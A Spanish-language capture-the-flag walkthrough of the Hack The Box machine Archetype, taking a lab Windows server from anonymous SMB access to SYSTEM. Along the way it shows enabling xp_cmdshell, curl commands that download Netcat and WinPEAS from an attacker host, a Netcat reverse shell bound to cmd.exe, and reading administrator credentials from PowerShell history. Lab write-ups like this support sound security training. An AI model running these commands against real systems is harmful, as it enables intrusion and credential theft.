# Manual Técnico: Hack The Box — Máquina Archetype
### Explotación de MSSQL, Ejecución Remota de Comandos y Escalada de Privilegios con WinPEAS

---

## Tabla de Contenidos

1. [Introducción y Contexto](#1-introducción-y-contexto)
2. [Reconocimiento y Enumeración](#2-reconocimiento-y-enumeración)
   - 2.1 [Escaneo de Puertos con Nmap](#21-escaneo-de-puertos-con-nmap)
   - 2.2 [Enumeración de Recursos SMB con smbclient](#22-enumeración-de-recursos-smb-con-smbclient)
3. [Extracción de Credenciales desde SMB](#3-extracción-de-credenciales-desde-smb)
   - 3.1 [Conexión Anónima al Recurso Compartido](#31-conexión-anónima-al-recurso-compartido)
   - 3.2 [Descarga y Análisis del Archivo de Configuración](#32-descarga-y-análisis-del-archivo-de-configuración)
4. [Herramienta: Impacket](#4-herramienta-impacket)
   - 4.1 [Concepto Teórico](#41-concepto-teórico)
   - 4.2 [Conexión a MSSQL con mssqlclient.py](#42-conexión-a-mssql-con-mssqlclientpy)
5. [Explotación de MSSQL: xp_cmdshell](#5-explotación-de-mssql-xp_cmdshell)
   - 5.1 [Concepto Teórico: xp_cmdshell](#51-concepto-teórico-xp_cmdshell)
   - 5.2 [Verificación de Privilegios de Administrador](#52-verificación-de-privilegios-de-administrador)
   - 5.3 [Activación de xp_cmdshell](#53-activación-de-xp_cmdshell)
6. [Obtención de Reverse Shell](#6-obtención-de-reverse-shell)
   - 6.1 [Concepto Teórico: Reverse Shell](#61-concepto-teórico-reverse-shell)
   - 6.2 [Preparación: Servidor HTTP con Python](#62-preparación-servidor-http-con-python)
   - 6.3 [Transferencia de Netcat a la Máquina Víctima](#63-transferencia-de-netcat-a-la-máquina-víctima)
   - 6.4 [Establecimiento de la Reverse Shell](#64-establecimiento-de-la-reverse-shell)
7. [Escalada de Privilegios con WinPEAS](#7-escalada-de-privilegios-con-winpeas)
   - 7.1 [Concepto Teórico: WinPEAS](#71-concepto-teórico-winpeas)
   - 7.2 [Transferencia y Ejecución de WinPEAS](#72-transferencia-y-ejecución-de-winpeas)
   - 7.3 [Extracción de Credenciales del Historial de PowerShell](#73-extracción-de-credenciales-del-historial-de-powershell)
8. [Acceso como Administrador con psexec.py](#8-acceso-como-administrador-con-psexecpy)
9. [Captura de las Flags](#9-captura-de-las-flags)
   - 9.1 [Flag de Usuario](#91-flag-de-usuario)
   - 9.2 [Flag de Administrador (Root)](#92-flag-de-administrador-root)
10. [Resumen de Puntos Clave](#10-resumen-de-puntos-clave)
11. [Inventario Final de Herramientas](#11-inventario-final-de-herramientas)

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 1. Introducción y Contexto

La máquina **Archetype** de Hack The Box es un entorno de práctica basado en **Windows Server** clasificado en el **Tier 2** de Starting Point. A diferencia de las máquinas del Tier 1, este nivel exige encadenar múltiples técnicas y comprender los mecanismos internos de Windows, incluyendo la administración de bases de datos Microsoft SQL Server y los mecanismos de autenticación del sistema operativo.

Las técnicas empleadas en esta máquina son:

- **Enumeración de recursos SMB:** acceso anónimo a un recurso compartido que expone un archivo de configuración con credenciales en texto claro.
- **Conexión autenticada a MSSQL:** uso de la suite Impacket para interactuar con la base de datos Microsoft SQL Server.
- **Ejecución remota de comandos vía xp_cmdshell:** funcionalidad nativa de MSSQL que permite ejecutar comandos del sistema operativo.
- **Reverse Shell mediante Netcat:** obtención de una sesión interactiva de terminal en la máquina víctima.
- **Escalada de privilegios con WinPEAS:** enumeración automatizada de vectores de escalada que revela credenciales almacenadas en el historial de PowerShell.
- **Acceso como NT AUTHORITY\SYSTEM con psexec.py:** conexión con privilegios máximos mediante Impacket.

El flujo de ataque sigue la metodología estándar: reconocimiento → enumeración → explotación → acceso inicial → escalada de privilegios → captura de flags.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 2. Reconocimiento y Enumeración

### 2.1 Escaneo de Puertos con Nmap

Se recomienda crear un directorio de trabajo específico para esta máquina antes de iniciar el reconocimiento, con el fin de mantener organizados los archivos generados durante la auditoría.

```bash
nmap -sV -sC --min-rate 5000 <IP_OBJETIVO> -oN nmap_archetype
```

**Descripción de los parámetros:**

| Flag               | Descripción                                                                          |
|--------------------|--------------------------------------------------------------------------------------|
| `-sV`              | Detecta y muestra las versiones de los servicios activos en cada puerto.             |
| `-sC`              | Ejecuta los scripts NSE (Nmap Scripting Engine) incluidos por defecto.               |
| `--min-rate 5000`  | Fija una tasa mínima de envío de 5000 paquetes por segundo para acelerar el escaneo. |
| `<IP_OBJETIVO>`    | Dirección IP de la máquina objetivo.                                                 |
| `-oN nmap_archetype` | Guarda la salida en formato legible en el archivo especificado.                    |

> **Nota sobre el flag `-sS`:** El modificador `-sS` (SYN scan) envía un paquete SYN y espera recibir un SYN-ACK para determinar si el puerto está abierto, sin completar el handshake TCP. El modificador `-sU` realiza el equivalente sobre UDP. Si no se especifica ninguno, Nmap utiliza `-sT` (TCP Connect scan) por defecto.

**Puertos relevantes identificados:**

| Puerto | Servicio              | Descripción                                                                        |
|--------|-----------------------|------------------------------------------------------------------------------------|
| 135    | RPC                   | Remote Procedure Call. Necesario para comunicación entre procesos en Windows.      |
| 139 / 445 | SMB (Samba)        | Protocolo para compartir archivos e impresoras en red. Vector principal de enumeración. |
| 1433   | MSSQL                 | Microsoft SQL Server. Puerto estándar de la base de datos objetivo.                |

> **Buena práctica:** El puerto 1433 expone un servicio de **Microsoft SQL Server**. La presencia de este puerto es la respuesta a la primera pregunta de la máquina: el puerto que aloja una base de datos es el **1433**.

**Resumen de puntos clave — Sección 2.1:**
- El flag `-oN` guarda la salida del escaneo para referencia posterior; su uso es indispensable en cualquier auditoría.
- El puerto 1433 corresponde siempre a Microsoft SQL Server en entornos Windows.
- Los puertos 139 y 445 exponen el protocolo SMB, un vector de enumeración fundamental en entornos Windows.

---

### 2.2 Enumeración de Recursos SMB con smbclient

Para identificar los recursos compartidos disponibles a través de SMB sin necesidad de credenciales, se utiliza `smbclient` con los flags `-N` y `-L`.

```bash
smbclient -N -L //<IP_OBJETIVO>
```

**Descripción de los parámetros:**

| Flag             | Descripción                                                                         |
|------------------|-------------------------------------------------------------------------------------|
| `-N`             | Suprime la solicitud de contraseña, permitiendo la conexión sin credenciales (sesión nula). |
| `-L`             | Lista todos los recursos compartidos (shares) disponibles en el servidor especificado. |
| `//<IP_OBJETIVO>`| Ruta al servidor SMB objetivo en formato UNC simplificado.                          |

**Recursos compartidos típicos en Windows:**

| Share          | Descripción                                                                          |
|----------------|--------------------------------------------------------------------------------------|
| `ADMIN$`       | Recurso administrativo predeterminado. Corresponde al directorio `%SystemRoot%`.    |
| `C$`           | Recurso administrativo predeterminado. Corresponde a la raíz de la unidad C.        |
| `IPC$`         | Recurso de comunicación entre procesos. Utilizado por servicios internos de Windows. |
| `backups`      | Recurso no estándar creado manualmente. Candidato prioritario para inspección.       |

> **Criterio de identificación:** Los recursos que incluyen el símbolo `$` en su nombre son compartidos administrativos generados automáticamente por Windows. Cualquier recurso que no lleve el sufijo `$` ha sido creado de forma manual y debe considerarse como vector de ataque potencial. En esta máquina, el recurso relevante es **`backups`**.

**Resumen de puntos clave — Sección 2.2:**
- La conexión sin credenciales (sesión nula) es posible cuando el servidor no requiere autenticación para listar recursos.
- Los recursos con `$` son predeterminados del sistema; los que carecen de él son de creación manual y de mayor interés.
- La respuesta a la pregunta sobre el share no administrativo disponible es: **`backups`**.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 3. Extracción de Credenciales desde SMB

### 3.1 Conexión Anónima al Recurso Compartido

Una vez identificado el recurso `backups`, se intenta acceder a él sin credenciales. Al pulsar Enter cuando se solicita la contraseña, el sistema acepta la conexión si el recurso no está protegido.

```bash
smbclient //<IP_OBJETIVO>/backups
```

Una vez dentro de la sesión SMB interactiva, se lista el contenido del recurso:

```bash
ls
```

Si el sistema devuelve un listado de archivos, confirma que el acceso anónimo está habilitado en ese recurso.

---

### 3.2 Descarga y Análisis del Archivo de Configuración

Al listar el recurso `backups`, se identifica el archivo `prod.dtsconfig`. Se descarga a la máquina local con el comando `get`.

```bash
get prod.dtsconfig
```

**Descripción del comando:**

| Comando          | Descripción                                                                          |
|------------------|--------------------------------------------------------------------------------------|
| `get <archivo>`  | Descarga el archivo especificado desde el recurso SMB al directorio de trabajo local. |

Una vez descargado, se sale de la sesión SMB y se inspecciona el archivo:

```bash
exit
cat prod.dtsconfig
```

**Descripción de los comandos:**

| Comando            | Descripción                                                                        |
|--------------------|------------------------------------------------------------------------------------|
| `exit`             | Cierra la sesión SMB activa y regresa a la terminal local.                         |
| `cat prod.dtsconfig` | Muestra el contenido íntegro del archivo en la terminal.                         |

El archivo `.dtsconfig` es un archivo de configuración de paquetes SSIS (SQL Server Integration Services) de Microsoft. Al inspeccionarlo, se localizan credenciales en texto claro con la siguiente estructura:

- **Usuario:** `sql_svc`
- **Dominio:** `ARCHETYPE`
- **Contraseña:** `M3g4c0rp123`

> **Nota:** La presencia de credenciales en texto claro en archivos de configuración es un error de seguridad habitual en entornos mal configurados. Este hallazgo responde a la pregunta sobre cuál es la contraseña del usuario de servicio.

**Resumen de puntos clave — Sección 3:**
- El acceso anónimo a recursos SMB es posible cuando el servidor no exige autenticación. Siempre debe probarse antes de intentar ataques de fuerza bruta.
- El comando `get` de `smbclient` descarga archivos desde el recurso compartido al directorio de trabajo local.
- Los archivos de configuración (`.config`, `.dtsconfig`, `.xml`) son candidatos frecuentes a contener credenciales en texto claro.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 4. Herramienta: Impacket

### 4.1 Concepto Teórico

**Impacket** es una suite de scripts programados en Python diseñada para interactuar con protocolos y servicios de entornos Windows y Active Directory desde sistemas Linux. Entre sus funcionalidades principales se encuentran:

- Establecer conexiones autenticadas a bases de datos **MSSQL** (`mssqlclient.py`).
- Ejecutar comandos remotos con privilegios de SYSTEM (`psexec.py`).
- Enumerar usuarios, equipos y tickets de Kerberos en entornos de Active Directory.
- Realizar volcados de hashes NTLM y extracción de credenciales.

Para listar todos los módulos de Impacket disponibles en Kali Linux:

```bash
impacket-
```

> Pulsar `Tab` tras el guión para que el autocompletado del shell muestre todos los scripts preinstalados. Al ser scripts de Python, la respuesta a preguntas que soliciten el nombre del script debe incluir la extensión `.py` (por ejemplo, `mssqlclient.py`).

Impacket viene **preinstalado en Kali Linux**. No requiere instalación adicional.

---

### 4.2 Conexión a MSSQL con mssqlclient.py

Con las credenciales obtenidas del archivo de configuración, se establece una conexión autenticada al servicio MSSQL de la máquina víctima.

```bash
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@<IP_OBJETIVO> -windows-auth
```

**Descripción de los parámetros:**

| Elemento                  | Descripción                                                                          |
|---------------------------|--------------------------------------------------------------------------------------|
| `ARCHETYPE`               | Nombre del dominio en el que se encuentra el usuario. Extraído del archivo `.dtsconfig`. |
| `sql_svc`                 | Nombre de usuario de la cuenta de servicio.                                          |
| `M3g4c0rp123`             | Contraseña del usuario, en texto claro.                                              |
| `@<IP_OBJETIVO>`          | Dirección IP de la máquina víctima.                                                  |
| `-windows-auth`           | Fuerza la autenticación mediante Windows Authentication en lugar de SQL Authentication. Necesario para cuentas de dominio y cuentas de servicio. |

> **Motivo del flag `-windows-auth`:** La cuenta `sql_svc` es una **cuenta de servicio de dominio**, no una cuenta de usuario local de SQL Server. Por este motivo, debe autenticarse a través del mecanismo de Windows Authentication (NTLM) y no mediante el sistema propio de SQL Server.

La sesión resultante es un cliente interactivo de base de datos. Desde este entorno se pueden ejecutar consultas SQL y comandos propios de MSSQL, pero no comandos arbitrarios del sistema operativo directamente.

**Resumen de puntos clave — Sección 4:**
- Impacket es una suite de herramientas Python orientada a entornos Windows y Active Directory, preinstalada en Kali Linux.
- El script `mssqlclient.py` establece conexiones autenticadas a Microsoft SQL Server.
- El flag `-windows-auth` es necesario cuando el usuario es una cuenta de dominio o cuenta de servicio.
- La estructura del target es: `DOMINIO/usuario:contraseña@IP`.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 5. Explotación de MSSQL: xp_cmdshell

### 5.1 Concepto Teórico: xp_cmdshell

**`xp_cmdshell`** es un procedimiento almacenado extendido de Microsoft SQL Server que permite ejecutar comandos arbitrarios del sistema operativo Windows directamente desde una sesión MSSQL. Los comandos se ejecutan en el contexto del usuario bajo el que corre el servicio SQL Server.

Por motivos de seguridad, `xp_cmdshell` se encuentra **desactivado por defecto** en instalaciones modernas de SQL Server. Sin embargo, si el usuario conectado posee privilegios de administrador de la base de datos (rol `sysadmin`), es posible habilitarlo mediante comandos de configuración avanzada.

---

### 5.2 Verificación de Privilegios de Administrador

Antes de intentar habilitar `xp_cmdshell`, se verifica si el usuario actual pertenece al rol `sysadmin` mediante una consulta SQL:

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```

**Interpretación del resultado:**

| Valor devuelto | Significado                                                             |
|----------------|-------------------------------------------------------------------------|
| `1`            | El usuario actual pertenece al rol `sysadmin` y tiene privilegios de administrador. |
| `0`            | El usuario no pertenece al rol `sysadmin`.                              |
| `NULL`         | El rol especificado no existe en el servidor.                           |

> Si el resultado es `1`, el usuario tiene capacidad para habilitar `xp_cmdshell` y ejecutar comandos del sistema.

---

### 5.3 Activación de xp_cmdshell

La activación se realiza en dos pasos desde la sesión MSSQL:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Descripción de los comandos:**

| Comando                                      | Descripción                                                                    |
|----------------------------------------------|--------------------------------------------------------------------------------|
| `sp_configure 'show advanced options', 1`    | Habilita la visualización y modificación de opciones avanzadas del servidor.   |
| `RECONFIGURE`                                | Aplica los cambios de configuración realizados con `sp_configure`.             |
| `sp_configure 'xp_cmdshell', 1`              | Activa el procedimiento `xp_cmdshell`. El valor pasa de `0` a `1`.            |

Una vez activado, se puede verificar su funcionamiento ejecutando un comando del sistema:

```sql
EXEC xp_cmdshell 'whoami';
```

Si el comando devuelve el nombre del usuario del sistema (por ejemplo, `archetype\sql_svc`), la activación ha sido exitosa.

**Sintaxis general de xp_cmdshell:**

```sql
EXEC xp_cmdshell '<comando_de_windows>';
```

Todo lo incluido entre las comillas simples se ejecuta como un comando de la terminal CMD de Windows en la máquina víctima.

**Resumen de puntos clave — Sección 5:**
- `xp_cmdshell` permite ejecutar comandos de Windows desde una sesión MSSQL, pero requiere privilegios `sysadmin` para activarse.
- La activación requiere habilitar primero las opciones avanzadas con `sp_configure` y aplicar los cambios con `RECONFIGURE`.
- La verificación del resultado de `IS_SRVROLEMEMBER('sysadmin')` determina si el vector de ataque es viable.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 6. Obtención de Reverse Shell

### 6.1 Concepto Teórico: Reverse Shell

Una **reverse shell** (shell inversa) es una técnica mediante la cual la máquina víctima establece una conexión de red hacia la máquina atacante, en lugar de a la inversa. Esto permite eludir restricciones de firewall que bloquean conexiones entrantes hacia la víctima.

El flujo es el siguiente:

1. La máquina atacante se pone en escucha en un puerto determinado.
2. Se ordena a la máquina víctima (a través de `xp_cmdshell`) que ejecute Netcat apuntando hacia la IP y puerto de la atacante.
3. La víctima establece la conexión y abre una sesión interactiva de CMD en la máquina atacante.

**Netcat** (`nc.exe` / `nc64.exe`) es la herramienta que se utiliza en la máquina víctima para establecer dicha conexión. Al ser un ejecutable legítimo de Windows, Windows Defender puede bloquearlo; en ese caso, se recomienda probar la versión de 32 bits o la disponible en `/usr/share/windows-resources/binaries/nc.exe` en Kali Linux.

---

### 6.2 Preparación: Servidor HTTP con Python

Para transferir `nc64.exe` a la máquina víctima, se levanta un servidor HTTP básico en la máquina atacante desde el directorio donde se encuentra el ejecutable.

```bash
python3 -m http.server 8080
```

**Descripción de los parámetros:**

| Elemento          | Descripción                                                                          |
|-------------------|--------------------------------------------------------------------------------------|
| `python3`         | Intérprete de Python 3. Usar `python` si `python3` no está disponible.              |
| `-m http.server`  | Invoca el módulo de servidor HTTP integrado de Python.                               |
| `8080`            | Puerto en el que se levanta el servidor. Puede ser cualquier puerto no privilegiado. |

Una vez activo, todos los archivos del directorio de trabajo son accesibles a través de `http://<IP_ATACANTE>:8080/` desde cualquier máquina de la misma red.

> **Requisito:** El servidor debe levantarse desde el directorio que contiene `nc64.exe`. Si el ejecutable se encuentra en `~/Downloads`, hay que situar la terminal en esa ruta antes de ejecutar el comando.

---

### 6.3 Transferencia de Netcat a la Máquina Víctima

Desde la sesión MSSQL, se utiliza `xp_cmdshell` con `curl` para descargar `nc64.exe` en la máquina víctima y guardarlo en el directorio `C:\Users\Public\`, que tiene permisos de escritura para todos los usuarios del sistema.

```sql
EXEC xp_cmdshell 'curl http://<IP_ATACANTE>:8080/nc64.exe --output C:\Users\Public\nc.exe';
```

**Descripción de los parámetros:**

| Elemento                      | Descripción                                                                      |
|-------------------------------|----------------------------------------------------------------------------------|
| `curl`                        | Herramienta de transferencia de datos por URL, disponible en Windows 10+.        |
| `http://<IP_ATACANTE>:8080/nc64.exe` | URL del archivo servido por el servidor HTTP de Python en la máquina atacante. |
| `--output C:\Users\Public\nc.exe` | Ruta y nombre de destino del archivo descargado en la máquina víctima.      |

> **Motivo de `C:\Users\Public\`:** Este directorio es de acceso universal en Windows: cualquier usuario del sistema, independientemente de sus privilegios, tiene permisos de lectura, escritura y ejecución sobre él. Se utiliza como destino de escritura cuando no se conoce qué otras rutas son accesibles con el usuario actual.

> **Nota sobre las barras:** En rutas de Windows, el separador de directorios es la barra invertida (`\`). Al escribir rutas dentro de cadenas en comandos de MSSQL o CMD, es necesario respetar este separador.

Si la descarga es exitosa, el servidor HTTP de Python registrará una petición `GET` con código `200 OK` procedente de la IP de la máquina víctima.

---

### 6.4 Establecimiento de la Reverse Shell

**Paso 1:** Poner Netcat en escucha en la máquina atacante.

```bash
nc -lvnp 9001
```

**Descripción de los parámetros:**

| Flag | Descripción                                                                               |
|------|-------------------------------------------------------------------------------------------|
| `-l` | Modo listening: Netcat queda en escucha esperando conexiones entrantes.                   |
| `-v` | Modo verbose: muestra información detallada sobre las conexiones establecidas.            |
| `-n` | No resuelve nombres DNS. Trabaja directamente con direcciones IP.                         |
| `-p` | Especifica el puerto en el que se queda en escucha. Debe indicarse como último flag.      |
| `9001` | Puerto elegido para recibir la conexión. Puede ser cualquier puerto no privilegiado.   |

**Paso 2:** Desde la sesión MSSQL, ordenar a la víctima que ejecute Netcat apuntando hacia la máquina atacante.

```sql
EXEC xp_cmdshell 'C:\Users\Public\nc.exe -e cmd.exe <IP_ATACANTE> 9001';
```

**Descripción de los parámetros:**

| Elemento          | Descripción                                                                          |
|-------------------|--------------------------------------------------------------------------------------|
| `C:\Users\Public\nc.exe` | Ruta al ejecutable de Netcat previamente descargado en la víctima.         |
| `-e cmd.exe`      | Vincula la ejecución de `cmd.exe` a la conexión establecida, proporcionando una shell interactiva. |
| `<IP_ATACANTE>`   | Dirección IP de la máquina atacante (IP de la interfaz VPN de Hack The Box, usualmente `tun0`). |
| `9001`            | Puerto en el que la máquina atacante está en escucha.                                |

Una vez ejecutado el comando, la sesión MSSQL quedará aparentemente bloqueada. En la terminal donde se ejecutó `nc -lvnp 9001`, aparecerá el banner de una sesión CMD de Windows activa. El comando `whoami` confirmará que la sesión corresponde al usuario `archetype\sql_svc`.

**Resumen de puntos clave — Sección 6:**
- El servidor HTTP de Python permite transferir herramientas a la máquina víctima sin necesidad de acceso directo al sistema de archivos.
- `C:\Users\Public\` es el directorio de escritura universal en Windows y debe utilizarse cuando no se conocen los permisos de otras rutas.
- `nc -lvnp <puerto>` pone Netcat en escucha en la máquina atacante; la flag `-p` debe ser la última del grupo.
- La flag `-e cmd.exe` del Netcat en la víctima vincula una sesión CMD a la conexión, proporcionando la reverse shell.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 7. Escalada de Privilegios con WinPEAS

### 7.1 Concepto Teórico: WinPEAS

**WinPEAS** (Windows Privilege Escalation Awesome Script) es una herramienta de enumeración automatizada orientada a identificar vectores de escalada de privilegios en sistemas Windows. Forma parte de la suite **PEAS-ng** junto a **LinPEAS** (su equivalente para Linux).

WinPEAS ejecuta una serie de scripts y consultas al sistema que comprueban, entre otros aspectos:

- Versiones del sistema operativo y parches aplicados (vulnerabilidades conocidas como EternalBlue).
- Servicios y tareas programadas con configuraciones incorrectas.
- Credenciales almacenadas en archivos de configuración, registros y el historial de consola.
- Permisos incorrectos en archivos, directorios y claves de registro.
- Variables de entorno y rutas con escritura no restringida.

**Codificación de colores en la salida de WinPEAS:**

| Color                    | Significado                                                                 |
|--------------------------|-----------------------------------------------------------------------------|
| Verde                    | Información del sistema sin implicación de seguridad directa.               |
| Amarillo                 | Elemento a revisar con atención moderada.                                   |
| Rojo                     | Elemento que debe revisarse con alta prioridad.                             |
| Rojo con fondo amarillo  | Vulnerabilidad potencialmente explotable para escalada de privilegios.      |

> WinPEAS se encuentra preinstalado en Kali Linux en la ruta `/usr/share/peass/winpeas/`. No es necesario descargarlo externamente.

---

### 7.2 Transferencia y Ejecución de WinPEAS

Con el servidor HTTP de Python activo (o reactivado), se transfiere `winPEASx64.exe` a la máquina víctima siguiendo el mismo procedimiento que con Netcat.

```sql
EXEC xp_cmdshell 'curl http://<IP_ATACANTE>:8080/winPEASx64.exe --output C:\Users\Public\winpeas.exe';
```

Una vez descargado, se ejecuta desde la reverse shell activa:

```cmd
C:\Users\Public\winpeas.exe
```

La ejecución puede tardar varios minutos. La salida es extensa y debe analizarse buscando los campos marcados con colores de alta criticidad.

---

### 7.3 Extracción de Credenciales del Historial de PowerShell

Entre los hallazgos de WinPEAS, se identifica la ruta del **historial de consola de PowerShell**, que almacena los comandos ejecutados previamente por los usuarios del sistema. Esta ruta corresponde al archivo `ConsoleHost_history.txt`.

```cmd
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Descripción del comando:**

| Elemento                         | Descripción                                                                    |
|----------------------------------|--------------------------------------------------------------------------------|
| `type`                           | Comando de Windows CMD equivalente a `cat` en Linux. Muestra el contenido de un archivo de texto. |
| `ConsoleHost_history.txt`        | Archivo que almacena el historial de comandos de PowerShell del usuario.       |

En el historial se localiza un comando de conexión con credenciales de administrador en texto claro:

```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

Esto revela las credenciales de la cuenta de administrador local:

- **Usuario:** `administrator`
- **Contraseña:** `MEGACORP_4dm1n!!`

**Resumen de puntos clave — Sección 7:**
- WinPEAS es la herramienta estándar para enumeración de vectores de escalada en Windows; LinPEAS es su equivalente para Linux.
- El historial de PowerShell (`ConsoleHost_history.txt`) es un registro que frecuentemente contiene comandos con credenciales expuestas.
- La codificación de colores de WinPEAS orienta al auditor sobre la criticidad de cada hallazgo; los campos en rojo con fondo amarillo indican vulnerabilidades explotables.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 8. Acceso como Administrador con psexec.py

Con las credenciales de administrador obtenidas, se establece una sesión remota con privilegios máximos utilizando `psexec.py` de Impacket.

**`psexec.py`** es un módulo de Impacket que utiliza el protocolo SMB para depositar y ejecutar un servicio en la máquina remota, obteniendo una sesión interactiva como **NT AUTHORITY\SYSTEM**, la cuenta con el nivel de privilegios más alto en Windows.

```bash
impacket-psexec administrator:MEGACORP_4dm1n\!\!@<IP_OBJETIVO>
```

> **Nota sobre caracteres especiales en la contraseña:** El símbolo `!` tiene significado especial en Bash (expansión del historial). Si la contraseña contiene `!`, debe escaparse con `\!` al escribirla directamente en la línea de comandos. Alternativamente, se puede encerrar entre comillas simples: `'MEGACORP_4dm1n!!'`.

**Descripción de los parámetros:**

| Elemento               | Descripción                                                                          |
|------------------------|--------------------------------------------------------------------------------------|
| `administrator`        | Nombre de usuario con el que se realiza la autenticación.                            |
| `MEGACORP_4dm1n!!`     | Contraseña del usuario administrador.                                                |
| `@<IP_OBJETIVO>`       | Dirección IP de la máquina víctima.                                                  |

Una vez autenticado correctamente, el prompt indicará que la sesión corre como `NT AUTHORITY\SYSTEM`:

```
C:\Windows\system32>whoami
nt authority\system
```

**Funcionamiento interno de psexec.py:** La herramienta accede al protocolo SMB de la máquina remota y deposita un ejecutable temporal a través de las funciones de Windows Internals. Dicho ejecutable se registra como un servicio del sistema, establece la conexión hacia la máquina atacante y otorga la sesión con privilegios de SYSTEM. Desde este nivel de acceso, es posible leer y escribir en cualquier directorio del sistema, independientemente de los permisos configurados.

**Resumen de puntos clave — Sección 8:**
- `psexec.py` de Impacket proporciona acceso con privilegios NT AUTHORITY\SYSTEM, el nivel más alto en Windows.
- Los caracteres especiales como `!` deben escaparse con `\` al usarlos en la línea de comandos de Bash.
- El módulo utiliza SMB internamente; el puerto 445 debe estar accesible en la máquina víctima.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 9. Captura de las Flags

### 9.1 Flag de Usuario

La flag de usuario se encuentra en el escritorio del usuario `sql_svc`. Desde la reverse shell o desde la sesión de psexec, se navega hasta la ruta correspondiente:

```cmd
type C:\Users\sql_svc\Desktop\user.txt
```

**Descripción de los comandos:**

| Comando                          | Descripción                                                                    |
|----------------------------------|--------------------------------------------------------------------------------|
| `type`                           | Muestra el contenido de un archivo de texto en CMD. Equivalente a `cat` en Linux. |
| `C:\Users\sql_svc\Desktop\user.txt` | Ruta estándar de la flag de usuario en máquinas Hack The Box con Windows.  |

---

### 9.2 Flag de Administrador (Root)

La flag de administrador se encuentra en el escritorio del usuario `Administrator`. Requiere privilegios elevados para acceder al directorio.

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

**Descripción de los comandos:**

| Comando                                    | Descripción                                                             |
|--------------------------------------------|-------------------------------------------------------------------------|
| `type`                                     | Muestra el contenido del archivo especificado.                          |
| `C:\Users\Administrator\Desktop\root.txt`  | Ruta estándar de la flag de administrador en máquinas Windows de HTB.  |

> En PowerShell, el comando `type` funciona como alias de `Get-Content`. En CMD clásico, `type` es el comando nativo para mostrar el contenido de archivos de texto.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 10. Resumen de Puntos Clave

**Reconocimiento:**
- Nmap con `-sV -sC` proporciona información de servicios y versiones; el flag `-oN` guarda la salida y es recomendable en toda auditoría.
- El puerto 1433 corresponde siempre a Microsoft SQL Server.
- Los puertos 139/445 exponen SMB, vector principal de enumeración en entornos Windows.

**Enumeración SMB:**
- `smbclient -N -L` permite listar recursos compartidos sin credenciales (sesión nula).
- Los shares sin sufijo `$` son de creación manual y deben inspeccionarse prioritariamente.
- Los archivos de configuración (`.dtsconfig`, `.config`, `.xml`) son candidatos habituales a contener credenciales en texto claro.

**Impacket y MSSQL:**
- `mssqlclient.py` establece conexiones autenticadas a MSSQL; el flag `-windows-auth` es necesario para cuentas de dominio.
- La pertenencia al rol `sysadmin` (verificada con `IS_SRVROLEMEMBER`) es el requisito para habilitar `xp_cmdshell`.
- `xp_cmdshell` permite ejecutar comandos del sistema operativo desde MSSQL, siempre que esté activado.

**Transferencia de herramientas:**
- El servidor HTTP de Python (`python3 -m http.server <puerto>`) es el método estándar para servir archivos a la víctima.
- `C:\Users\Public\` es el directorio de escritura universal en Windows; debe usarse cuando no se conocen los permisos de otras rutas.
- `curl --output` descarga archivos remotos en la ruta especificada de la máquina víctima.

**Reverse Shell:**
- `nc -lvnp <puerto>` pone Netcat en escucha en la máquina atacante.
- La flag `-e cmd.exe` en el Netcat de la víctima vincula una sesión CMD a la conexión inversa.
- La flag `-p` debe ser la última del grupo de flags de Netcat para que el puerto sea reconocido correctamente.

**Escalada de Privilegios:**
- WinPEAS enumera automáticamente vectores de escalada en Windows; LinPEAS es su equivalente para Linux.
- El historial de PowerShell (`ConsoleHost_history.txt`) almacena comandos previos y puede contener credenciales.
- La codificación de colores de WinPEAS orienta sobre la criticidad de los hallazgos: rojo con fondo amarillo indica una vulnerabilidad explotable.

**Acceso como Administrador:**
- `psexec.py` de Impacket proporciona acceso interactivo como NT AUTHORITY\SYSTEM.
- Los caracteres especiales como `!` en contraseñas deben escaparse con `\` en Bash.

---

<!-- SALTO DE PAGINA -->
<div style="page-break-after: always;"></div>

## 11. Inventario Final de Herramientas

| Herramienta / Plataforma    | Tipo                  | Descripción                                                                                                   | Instalación / Disponibilidad                                      |
|-----------------------------|-----------------------|---------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------|
| **Nmap**                    | Escáner de red        | Enumeración de puertos, servicios y versiones. Incluye scripts NSE.                                           | Preinstalado en Kali Linux                                        |
| **smbclient**               | Cliente SMB           | Herramienta para listar y acceder a recursos compartidos SMB. Permite sesiones sin credenciales (nulas).      | Preinstalado en Kali Linux                                        |
| **Impacket**                | Suite de herramientas | Conjunto de scripts Python para interactuar con protocolos y servicios Windows y Active Directory.            | Preinstalado en Kali Linux (`impacket-*`)                         |
| **mssqlclient.py**          | Cliente MSSQL         | Script de Impacket para establecer conexiones autenticadas a Microsoft SQL Server.                            | Incluido en Impacket (`impacket-mssqlclient`)                     |
| **psexec.py**               | Acceso remoto         | Script de Impacket para ejecutar comandos remotos como NT AUTHORITY\SYSTEM mediante SMB.                      | Incluido en Impacket (`impacket-psexec`)                          |
| **Python3 http.server**     | Servidor HTTP         | Módulo estándar de Python para levantar un servidor HTTP básico y servir archivos en la red local.            | Nativo en Python 3                                                |
| **Netcat (nc64.exe)**       | Utilidad de red       | Herramienta para crear conexiones TCP/UDP. Usada para establecer reverse shells desde la máquina víctima.     | Descarga desde GitHub o `/usr/share/windows-resources/binaries/`  |
